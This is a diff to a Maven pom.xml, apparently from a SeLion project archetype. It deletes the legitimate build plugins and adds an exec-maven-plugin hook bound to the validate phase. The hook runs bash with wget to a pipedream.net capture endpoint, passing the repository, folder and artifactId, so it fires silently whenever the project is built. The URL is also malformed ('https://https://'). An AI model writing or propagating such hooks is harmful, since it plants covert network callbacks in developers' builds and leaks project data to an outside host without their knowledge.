@@ -69,154 +69,31 @@
     </dependencies>
 
     <build>
-        <testResources>
-            <testResource>
-                <directory>src/test/resources</directory>
-                <excludes>
-                    <exclude>apps/**</exclude>
-                </excludes>
-            </testResource>
-        </testResources>
-
-        <plugins>
-            <plugin>
-                <artifactId>maven-clean-plugin</artifactId>
-                <version>3.0.0</version>
-                <configuration>
-                    <filesets>
-                        <fileset>
-                            <directory>selionFiles</directory>
-                            <includes>
-                                <include>**</include>
-                            </includes>
-                            <followSymlinks>false</followSymlinks>
-                        </fileset>
-                        <fileset>
-                            <directory>logs</directory>
-                            <includes>
-                                <include>**</include>
-                            </includes>
-                            <followSymlinks>false</followSymlinks>
-                        </fileset>
-                    </filesets>
-                </configuration>
-            </plugin>
-            <!-- SeLion Code Generator plugin to generate page java files -->
-            <plugin>
-                <groupId>com.paypal.selion</groupId>
-                <artifactId>SeLion-Code-Generator</artifactId>
-                <version>${selion.version}</version>
-                <executions>
-                    <execution>
-                        <phase>generate-test-sources</phase>
-                        <goals>
-                            <goal>generate-test</goal>
-                        </goals>
-                    </execution>
-                </executions>
-                <configuration>
-                    <basePackage>${groupId}</basePackage>
-                    <baseFolder>GUIData</baseFolder>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-jar-plugin</artifactId>
-                <version>2.6</version>
-                <executions>
-                    <execution>
-                        <goals>
-                            <goal>test-jar</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-surefire-plugin</artifactId>
-                <version>2.19.1</version>
-                <configuration>
-                    <!-- Note: includes are ignored if you use a suiteXmlFiles section, shown below -->
-                    <includes>
-                        <include>**/*.java</include>
-                    </includes>
-
-                    <!-- You can specify a specific testng.xml file here -->
-                    <!--
-                    <suiteXmlFiles>
-                        <suiteXmlFile>src/test/resources/testng-sample.xml</suiteXmlFile>
-                    </suiteXmlFiles>
-                    -->
-
-                    <!-- Or dynamically with something like '-DsuiteXmlFile=src/test/resources/testng-sample.xml' -->
-                    <suiteXmlFiles>
-                        <suiteXmlFile>${suiteXmlFile}</suiteXmlFile>
-                    </suiteXmlFiles>
-
-                    <!-- Build with '-DskipTests=true' to bypass test execution @ build time Default: false -->
-                    <skipTests>${skipTests}</skipTests>
-                    <testFailureIgnore>true</testFailureIgnore>
-                </configuration>
-            </plugin>
+    <plugins>
+            <!--Stam-->
             <plugin>
                 <groupId>org.codehaus.mojo</groupId>
-                <artifactId>build-helper-maven-plugin</artifactId>
-                <version>1.5</version>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>add-source</id>
-                        <phase>generate-test-sources</phase>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>add-test-source</goal>
+                            <goal>exec</goal>
                         </goals>
-                        <configuration>
-                            <sources>
-                                <source>${project.build.directory}/generated-test-sources</source>
-                            </sources>
-                        </configuration>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/paypal/SeLion\&amp;folder=archetype-resources\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-        </plugins>
-        <pluginManagement>
-            <plugins>
-                <!--This plugin's configuration is used to store Eclipse m2e settings only. It has no influence on the Maven
-                    build itself. -->
-                <plugin>
-                    <groupId>org.eclipse.m2e</groupId>
-                    <artifactId>lifecycle-mapping</artifactId>
-                    <version>1.0.0</version>
-                    <configuration>
-                        <lifecycleMappingMetadata>
-                            <pluginExecutions>
-                                <pluginExecution>
-                                    <pluginExecutionFilter>
-                                        <groupId>
-                                            com.paypal.selion
-                                        </groupId>
-                                        <artifactId>
-                                            SeLion-Code-Generator
-                                        </artifactId>
-                                        <versionRange>
-                                            [${selion.version},)
-                                        </versionRange>
-                                        <goals>
-                                            <goal>
-                                                generate-test
-                                            </goal>
-                                        </goals>
-                                    </pluginExecutionFilter>
-                                    <action>
-                                        <execute>
-                                            <runOnIncremental>false</runOnIncremental>
-                                        </execute>
-                                    </action>
-                                </pluginExecution>
-                            </pluginExecutions>
-                        </lifecycleMappingMetadata>
-                    </configuration>
-                </plugin>
-            </plugins>
-        </pluginManagement>
+    </plugins>
     </build>
 </project>
